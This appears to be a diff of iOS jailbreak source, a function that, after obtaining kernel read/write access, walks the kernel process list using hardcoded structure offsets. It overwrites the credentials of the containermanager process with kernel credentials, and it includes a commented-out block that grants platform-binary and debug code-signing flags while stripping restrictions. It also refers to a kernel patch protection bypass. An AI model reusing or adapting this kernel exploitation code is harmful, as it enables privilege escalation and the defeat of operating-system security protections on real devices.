@@ -10,33 +10,8 @@
 #include "kpp.h"
 #include "kernel.h"
 
-// @qwertyoruiop's KPP bypass
-
 #import "pte_stuff.h"
 #include "patchfinder64.h"
-
-
-#define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
-#define CS_INSTALLER        0x0000008    /* has installer entitlement */
-#define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
-#define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
-#define CS_HARD             0x0000100    /* don't load invalid pages */
-#define CS_KILL             0x0000200    /* kill process if it becomes invalid */
-
-
-unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
-unsigned offsetof_task = 0x18;                // proc_t::task
-unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
-unsigned offsetof_p_comm = 0x26c;             // proc_t::p_comm
-unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
-unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
-unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
-unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
-unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
-unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
-unsigned offsetof_special = 2 * sizeof(long); // host::special
-
-//uint64_t allproc = 0x59AC60; // iPhone 6S - 10.3.2
 
 
 kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, task_t tfp0, uint64_t credpatch) {
@@ -55,39 +30,60 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
     printf("[INFO]: sucessfully initialized kernel\n");
     
     
-    /* fix containermanagerd */
+/* TEST ----------------------------------------------------------------------*/
     
-    uint64_t proc = ReadAnywhere64(find_allproc());
-    printf("[INFO]: allproc = 0x%llx \n", proc);
-    
-    while (proc) {
-        uint32_t pid = (uint32_t)ReadAnywhere32(proc + 0x10);
+    {
+        #define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
+        #define CS_INSTALLER        0x0000008    /* has installer entitlement */
+        #define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
+        #define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
+        #define CS_HARD             0x0000100    /* don't load invalid pages */
+        #define CS_KILL             0x0000200    /* kill process if it becomes invalid */
         
-        char comm[20];
-        kread(proc + offsetof_p_comm, comm, 16);
-        comm[17] = 0;
-        //printf("[INFO]: found proc: pid=%d name=%s \n", pid, comm);
+        unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
+        unsigned offsetof_task = 0x18;                // proc_t::task
+        unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
+        unsigned offsetof_p_comm = 0x26c;             // proc_t::p_comm
+        unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
+        unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
+        unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
+        unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
+        unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
+        unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
+        unsigned offsetof_special = 2 * sizeof(long); // host::special
         
-        if (strstr(comm, "containermanager")) {
-            printf("found containermanager proc at 0x%llx \n", proc);
-            WriteAnywhere64(proc + offsetof_p_ucred, credpatch);
-            printf("gave it kern creds \n");
+        
+        uint64_t proc = ReadAnywhere64(find_allproc());
+        while (proc) {
+            //uint32_t pid = (uint32_t)ReadAnywhere32(proc + 0x10);
+            
+            char comm[20];
+            kread(proc + offsetof_p_comm, comm, 16);
+            comm[17] = 0;
+            
+            //printf("[INFO]: found proc: pid=%d name=%s \n", pid, comm);
+            
+            if (strstr(comm, "containermanager")) {
+                printf("found containermanager proc at 0x%llx \n", proc);
+                WriteAnywhere64(proc + offsetof_p_ucred, credpatch);
+                printf("gave it kern creds \n");
+            }
+            
+            // hand out entitlements?
+//            if (pid > 1) {
+//                uint32_t csflags = ReadAnywhere32(proc + offsetof_p_csflags);
+//                WriteAnywhere32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
+//            }
+            
+            proc = ReadAnywhere64(proc);
         }
-        else if (pid == 1) {
-            printf("found launchd proc at 0x%llx \n", proc);
-        }
-        
-        // test
-//        if (pid > 1) {
-//            uint32_t csflags = ReadAnywhere32(proc + offsetof_p_csflags);
-//            WriteAnywhere32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
-//        }
-        
-        proc = ReadAnywhere64(proc);
     }
     
+/* END TEST ------------------------------------------------------------------*/
     
     
+    
+    // @qwertyoruiop's KPP bypass
     
     uint64_t gStoreBase = find_gPhysBase();
     printf("[INFO]: gStoreBase = %llx \n", gStoreBase);
